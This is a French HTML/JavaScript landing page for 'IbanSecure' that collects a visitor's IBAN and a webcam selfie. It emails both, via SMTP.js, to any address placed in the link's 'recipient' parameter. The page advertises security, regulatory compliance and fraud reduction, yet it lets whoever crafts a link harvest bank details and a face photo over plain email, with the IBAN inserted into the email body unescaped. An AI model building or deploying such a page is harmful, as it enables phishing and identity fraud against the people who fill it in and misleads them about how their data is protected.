<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="IbanSecure simplifie la vérification de la personne en combinant votre IBAN et un selfie pour une validation rapide et sécurisée. Complétez vos informations et vos données seront envoyées par e-mail à celui qui vous a transmis le lien.">
  <title>IbanSecure - Envoi d'IBAN sécurisé & Selfie</title>
  <style>
    /* --- Réinitialisation & Variables --- */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    :root {
      --primary-color: #002147; /* Bleu profond */
      --accent-color: #d4af37;  /* Doré */
      --light-bg: #f7f7f7;
      --text-color: #333;
      --cas-color: #FF7F50;    /* Corail pour Cas d'usage */
      --avantages-color: #2E8B57; /* Vert SeaGreen pour Avantages */
    }
    html, body {
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background: #fff;
      color: var(--text-color);
      line-height: 1.6;
    }
    
    /* --- Header & Navigation --- */
    header {
      background: var(--primary-color);
      color: #fff;
      padding: 20px 0;
    }
    header .container {
      max-width: 1200px;
      margin: auto;
      padding: 0 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
    }
    header h1 { font-size: 24px; }
    nav ul {
      list-style: none;
      display: flex;
      gap: 15px;
    }
    nav ul li { font-size: 16px; }
    nav ul li a {
      color: #fff;
      text-decoration: none;
      transition: color 0.3s;
    }
    nav ul li a:hover { text-decoration: underline; }
    
    /* --- Section Hero (Style épuré, inspiré d'Apple) --- */
    .hero {
      background: linear-gradient(135deg, #ffffff, #f2f2f2);
      padding: 100px 20px;
      text-align: center;
    }
    .hero h2 {
      font-size: 48px;
      font-weight: 500;
      color: #111;
      margin-bottom: 20px;
    }
    .hero p {
      font-size: 22px;
      color: #555;
      margin-bottom: 40px;
    }
    .cta-btn {
      padding: 15px 30px;
      border: 2px solid #111;
      background: transparent;
      color: #111;
      border-radius: 25px;
      font-size: 18px;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    .cta-btn:hover {
      background: #111;
      color: #fff;
    }
    
    /* --- Onglets (Tabs) --- */
    .tabs {
      max-width: 900px;
      margin: 40px auto;
      background: #fff;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
      border-radius: 5px;
      overflow: hidden;
    }
    .tab-links {
      list-style: none;
      display: flex;
      background: var(--light-bg);
      border-bottom: 1px solid #ccc;
    }
    .tab-links li {
      flex: 1;
      text-align: center;
      position: relative;
    }
    .tab-links li a {
      display: block;
      padding: 15px;
      color: var(--primary-color);
      text-decoration: none;
      font-weight: bold;
      transition: background 0.3s;
    }
    .tab-links li a:hover {
      background: #fff;
    }
    /* Indicateur underline dynamique pour l'onglet actif */
    .tab-links li.active a::after {
      content: "";
      position: absolute;
      bottom: 0;
      left: 20%;
      width: 60%;
      height: 4px;
      border-radius: 2px;
    }
    /* Couleurs spécifiques pour chaque onglet actif */
    .tab-links li.tab-fonctionnalites.active a::after {
      background: #002147;
    }
    .tab-links li.tab-cas.active a::after {
      background: var(--cas-color);
    }
    .tab-links li.tab-avantages.active a::after {
      background: var(--avantages-color);
    }
    .tab-content {
      padding: 20px;
    }
    .tab { display: none; }
    .tab.active { display: block; }
    
    /* --- Présentation en cartes (pour Fonctionnalités, Cas d'usage et Avantages) --- */
    .card-grid, .use-case-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      margin-top: 20px;
    }
    .card-grid .card, .use-case-grid .use-case-card {
      background: #fff;
      border: 1px solid #e0e0e0;
      border-radius: 8px;
      padding: 20px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
      transition: transform 0.3s;
    }
    .card-grid .card:hover, .use-case-grid .use-case-card:hover {
      transform: translateY(-5px);
    }
    .card-grid .card h4, .use-case-grid .use-case-card h4 {
      margin-bottom: 10px;
      font-size: 20px;
      color: var(--primary-color);
    }
    .card-grid .card p, .use-case-grid .use-case-card p {
      font-size: 16px;
      color: #555;
    }
    
    /* --- Fonctionnement (Timeline) --- */
    .timeline-section {
      max-width: 900px;
      margin: 40px auto;
      padding: 20px;
    }
    .timeline-section h3 {
      text-align: center;
      color: var(--primary-color);
      margin-bottom: 20px;
      font-size: 28px;
    }
    .timeline {
      position: relative;
      margin: 40px 0;
      padding: 20px 0;
    }
    .timeline::after {
      content: '';
      position: absolute;
      width: 4px;
      background-color: var(--primary-color);
      top: 0;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%);
    }
    .timeline-item {
      padding: 20px 40px;
      position: relative;
      background: #fff;
      width: 50%;
    }
    .timeline-item::after {
      content: '';
      position: absolute;
      width: 20px;
      height: 20px;
      right: -10px;
      background: #fff;
      border: 4px solid var(--primary-color);
      top: 25px;
      border-radius: 50%;
      z-index: 1;
    }
    .timeline-item.left { left: 0; }
    .timeline-item.right { left: 50%; }
    .timeline-item.left::before {
      content: "";
      position: absolute;
      top: 30px;
      right: 30px;
      border: solid var(--primary-color);
      border-width: 10px 0 10px 10px;
      border-color: transparent transparent transparent var(--primary-color);
    }
    .timeline-item.right::before {
      content: "";
      position: absolute;
      top: 30px;
      left: 30px;
      border: solid var(--primary-color);
      border-width: 10px 10px 10px 0;
      border-color: transparent var(--primary-color) transparent transparent;
    }
    .timeline-item h4 { margin-bottom: 8px; }
    .timeline-item p { margin: 0; }
    
    /* --- Formulaire de Vérification --- */
    .form-section {
      background: #fff;
      border-radius: 5px;
      padding: 30px;
      max-width: 600px;
      margin: 40px auto;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
    /* Titre du formulaire modifié */
    .form-section h3 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 26px;
      color: var(--primary-color);
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }
    label { font-weight: bold; color: var(--primary-color); }
    input[type="text"] {
      padding: 10px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
      width: 100%;
    }
    button {
      padding: 10px;
      background: var(--primary-color);
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover { background: #001533; }
    video, canvas {
      width: 100%;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .hidden { display: none; }
    
    /* --- CGU Dépliable --- */
    .cgu-container {
      border: 1px solid #ccc;
      border-radius: 4px;
      padding: 10px;
      background: var(--light-bg);
    }
    .toggle-cgu {
      background: none;
      border: none;
      color: var(--primary-color);
      font-weight: bold;
      cursor: pointer;
      margin-bottom: 10px;
      text-decoration: underline;
    }
    .cgu-content {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.3s ease;
      font-size: 14px;
      line-height: 1.4;
      color: var(--text-color);
    }
    .cgu-content.open {
      max-height: 300px;
      margin-bottom: 10px;
    }
    
    /* --- Footer --- */
    footer {
      background: var(--primary-color);
      color: #fff;
      padding: 20px;
      text-align: center;
    }
    footer a { color: var(--accent-color); }
    
    /* --- Responsive --- */
    @media (max-width: 768px) {
      .tab-links { flex-direction: column; }
      .timeline-item {
        width: 100%;
        left: 0 !important;
        padding-left: 70px;
        padding-right: 25px;
      }
      .timeline-item.right::before,
      .timeline-item.left::before { left: 60px; }
      .timeline::after { left: 60px; }
    }
  </style>
</head>
<body>
  <!-- Header & Navigation -->
  <header>
    <div class="container">
      <h1>IbanSecure</h1>
      <nav>
        <ul>
          <li><a href="#hero">Accueil</a></li>
          <li><a href="#tabs-section">Fonctionnalités</a></li>
          <li><a href="#timeline-section">Fonctionnement</a></li>
          <li><a href="#verify">Vérification</a></li>
          <li><a href="#cgu">CGU</a></li>
          <li><a href="#contact">Contact</a></li>
        </ul>
      </nav>
    </div>
  </header>
  
  <!-- Section Hero (Style épuré) -->
  <section class="hero" id="hero">
    <h2>Envoi d'IBAN sécurisé</h2>
    <p>Simplifiez vos démarches en envoyant votre IBAN de manière sécurisée, accompagné de votre selfie pour vérifier que vous êtes bien la personne concernée.</p>
    <button class="cta-btn" onclick="scrollToSection('verify')">Commencer</button>
  </section>
  
  <!-- Onglets (Tabs) : Fonctionnalités, Cas d'usage, Avantages -->
  <section class="tabs" id="tabs-section">
    <ul class="tab-links">
      <li class="active tab-fonctionnalites"><a href="#tab1">Fonctionnalités</a></li>
      <li class="tab-cas"><a href="#tab2">Cas d'usage</a></li>
      <li class="tab-avantages"><a href="#tab3">Avantages</a></li>
    </ul>
    <div class="tab-content">
      <!-- Onglet Fonctionnalités -->
      <div id="tab1" class="tab active">
        <h3>Fonctionnalités d'IbanSecure</h3>
        <p>Notre solution combine la vérification de votre IBAN et un selfie en temps réel pour confirmer que vous êtes bien la personne concernée, en toute sécurité.</p>
        <div class="card-grid">
          <div class="card">
            <h4>Authentification instantanée</h4>
            <p>Vérification rapide et fiable de la personne concernée.</p>
          </div>
          <div class="card">
            <h4>Réduction des fraudes</h4>
            <p>Minimisez les risques de fraude grâce à notre double vérification.</p>
          </div>
          <div class="card">
            <h4>Intégration aisée</h4>
            <p>Facilement intégrable à vos systèmes existants.</p>
          </div>
          <div class="card">
            <h4>Conformité réglementaire</h4>
            <p>Respect des normes en vigueur pour une sécurité optimale.</p>
          </div>
        </div>
      </div>
      
      <!-- Onglet Cas d'usage -->
      <div id="tab2" class="tab">
        <h3>Cas d'usage</h3>
        <p>Découvrez comment IbanSecure transforme vos processus :</p>
        <div class="use-case-grid">
          <div class="use-case-card">
            <h4>Ouverture de compte bancaire</h4>
            <p>Accélérez l'inscription de vos clients grâce à une vérification rapide de la personne concernée.</p>
          </div>
          <div class="use-case-card">
            <h4>Accès sécurisé aux services</h4>
            <p>Renforcez la sécurité de vos plateformes en validant que l'utilisateur est bien la personne qu'il prétend être.</p>
          </div>
          <div class="use-case-card">
            <h4>Transactions financières</h4>
            <p>Garantissez des échanges sûrs en confirmant que la personne effectuant la transaction est bien autorisée.</p>
          </div>
          <div class="use-case-card">
            <h4>Lutte contre la fraude</h4>
            <p>Prévenez les fraudes en vérifiant efficacement que la personne est bien celle qu'elle prétend être.</p>
          </div>
        </div>
      </div>
      
      <!-- Onglet Avantages -->
      <div id="tab3" class="tab">
        <h3>Avantages</h3>
        <p>En choisissant IbanSecure, vous bénéficiez de :</p>
        <div class="card-grid">
          <div class="card">
            <h4>Rapidité</h4>
            <p>Un processus de vérification rapide de la personne en quelques minutes.</p>
          </div>
          <div class="card">
            <h4>Sécurité renforcée</h4>
            <p>Double vérification pour une protection maximale.</p>
          </div>
          <div class="card">
            <h4>Facilité d'utilisation</h4>
            <p>Interface intuitive, accessible sur tous vos appareils.</p>
          </div>
          <div class="card">
            <h4>Conformité</h4>
            <p>Respect strict des normes légales et réglementaires.</p>
          </div>
          <div class="card">
            <h4>Fiabilité</h4>
            <p>Des vérifications précises qui inspirent confiance à vos clients.</p>
          </div>
        </div>
      </div>
    </div>
  </section>
  
  <!-- Fonctionnement d'IbanSecure (Timeline) -->
  <section class="timeline-section" id="timeline-section">
    <h3>Fonctionnement d'IbanSecure</h3>
    <div class="timeline">
      <div class="timeline-item left">
        <h4>Étape 1 : Réception du lien</h4>
        <p>Vous recevez un lien personnalisé vous invitant à compléter la vérification.</p>
      </div>
      <div class="timeline-item right">
        <h4>Étape 2 : Saisie de l'IBAN</h4>
        <p>Entrez votre IBAN pour initier le processus de vérification.</p>
      </div>
      <div class="timeline-item left">
        <h4>Étape 3 : Capture du Selfie</h4>
        <p>Utilisez votre caméra pour capturer votre selfie.</p>
      </div>
      <div class="timeline-item right">
        <h4>Étape 4 : Envoi des données</h4>
        <p>Vos informations sont transmises par e-mail à celui qui vous a envoyé le lien.</p>
      </div>
    </div>
  </section>
  
  <!-- Section Vérification (Formulaire) -->
  <section class="form-section" id="verify">
    <h3>J'envoie mon IBAN</h3>
    <!-- Indication du destinataire des données -->
    <p style="text-align:center; font-size:16px; color: var(--primary-color);">
      Vos données seront envoyées à : <span id="recipientDisplay" style="font-weight:bold;"></span>
    </p>
    <form id="uploadForm">
      <label for="iban">Votre IBAN :</label>
      <input type="text" id="iban" name="iban" placeholder="FR00 0000 0000 0000 0000 0000 000" required>
      
      <!-- Section Caméra & Selfie -->
      <div id="cameraSection">
        <button type="button" id="startCamera">Démarrer la caméra</button>
        <video id="video" autoplay class="hidden"></video>
        <button type="button" id="capture" class="hidden">Capturer le selfie</button>
        <canvas id="canvas" class="hidden"></canvas>
      </div>
      
      <!-- Section CGU Dépliable -->
      <div class="cgu-container" id="cgu">
        <button type="button" class="toggle-cgu" onclick="toggleCGU()">Afficher les Conditions Générales d'Utilisation</button>
        <div class="cgu-content" id="cguContent">
          <p>En utilisant IbanSecure, vous acceptez de fournir des informations véridiques et de respecter les lois et règlements en vigueur. Nous nous réservons le droit de modifier ces conditions à tout moment. Il est de votre responsabilité de consulter régulièrement ces CGU.</p>
          <p>Nous déclinons toute responsabilité quant aux erreurs ou omissions dans les informations fournies.</p>
        </div>
        <label>
          <input type="checkbox" id="accept-cgu" required> J'accepte les Conditions Générales d'Utilisation
        </label>
      </div>
      
      <button type="submit" id="submitBtn">Envoyer</button>
    </form>
  </section>
  
  <!-- Footer / Contact -->
  <footer id="contact">
    <p>&copy; 2025 IbanSecure. Tous droits réservés.</p>
    <p>Contactez-nous : <a href="mailto:contact@ibansecure.com">contact@ibansecure.com</a></p>
  </footer>
  
  <!-- JavaScript pour onglets, défilement, caméra & CGU -->
  <script>
    // Fonction de défilement fluide vers une section
    function scrollToSection(sectionId) {
      document.getElementById(sectionId).scrollIntoView({ behavior: 'smooth' });
    }
    
    // Gestion des onglets
    document.querySelectorAll('.tab-links a').forEach(link => {
      link.addEventListener('click', function(e) {
        e.preventDefault();
        const target = this.getAttribute('href');
        document.querySelectorAll('.tab-links li').forEach(li => li.classList.remove('active'));
        document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
        this.parentElement.classList.add('active');
        document.querySelector(target).classList.add('active');
      });
    });
    
    // Récupération du paramètre "recipient" dans l'URL
    function getRecipientEmail() {
      const params = new URLSearchParams(window.location.search);
      return params.get('recipient');
    }
    
    // Mise à jour de l'affichage du destinataire dans le formulaire
    const recipientEmail = getRecipientEmail();
    const recipientDisplay = document.getElementById('recipientDisplay');
    if(recipientEmail) {
      recipientDisplay.textContent = recipientEmail;
    } else {
      recipientDisplay.textContent = "inconnu";
      alert("Erreur : l'adresse e-mail du demandeur n'est pas spécifiée dans le lien.");
    }
    
    // Gestion de la caméra & capture du selfie
    const startCameraBtn = document.getElementById('startCamera');
    const captureBtn = document.getElementById('capture');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const form = document.getElementById('uploadForm');
    let stream;
    
    startCameraBtn.addEventListener('click', async function() {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        try {
          stream = await navigator.mediaDevices.getUserMedia({ video: true });
          video.srcObject = stream;
          video.classList.remove('hidden');
          captureBtn.classList.remove('hidden');
          startCameraBtn.classList.add('hidden');
        } catch (error) {
          alert("Erreur lors de l'accès à la caméra : " + error.message);
        }
      } else {
        alert("Votre navigateur ne supporte pas l'accès à la caméra.");
      }
    });
    
    captureBtn.addEventListener('click', function() {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.classList.remove('hidden');
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      video.classList.add('hidden');
      captureBtn.classList.add('hidden');
    });
    
    // Gestion du dépliage/rétractation des CGU
    function toggleCGU() {
      const cguContent = document.getElementById('cguContent');
      cguContent.classList.toggle('open');
    }
    
    // Validation du formulaire et envoi des données par e-mail vers le destinataire
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      const iban = document.getElementById('iban').value.trim();
      const cguAccepted = document.getElementById('accept-cgu').checked;
      
      if (!iban) {
        alert('Veuillez entrer un IBAN valide.');
        return;
      }
      if (!cguAccepted) {
        alert("Veuillez accepter les Conditions Générales d'Utilisation.");
        return;
      }
      if (canvas.classList.contains('hidden')) {
        alert('Veuillez capturer un selfie.');
        return;
      }
      
      // Récupération de l'image capturée sous forme de DataURL
      const selfieData = canvas.toDataURL('image/png');
      
      // Préparation du contenu de l'e-mail en HTML
      const emailBody = `
        <h3>Informations de vérification</h3>
        <p><strong>IBAN :</strong> ${iban}</p>
        <p><strong>Selfie :</strong></p>
        <p><img src="${selfieData}" alt="Selfie" style="max-width:300px;"/></p>
      `;
      
      // Envoi de l'e-mail via SMTP.js vers le destinataire extrait du lien
      Email.send({
        SecureToken: "votre_secure_token", // Remplacez par votre token sécurisé
        To: recipientEmail,
        From: "expediteur@domaine.com",    // Remplacez par votre adresse d'expéditeur
        Subject: "Envoi d'IBAN sécurisé & Selfie",
        Body: emailBody
      }).then(
        message => {
          alert("Vos données ont été envoyées avec succès : " + message);
          form.reset();
          canvas.classList.add('hidden');
          startCameraBtn.classList.remove('hidden');
        }
      ).catch(error => {
        alert("Erreur lors de l'envoi de l'e-mail : " + error);
      });
    });
  </script>
  <!-- Inclusion de la bibliothèque SMTP.js -->
  <script src="https://smtpjs.com/v3/smtp.js"></script>
</body>
</html>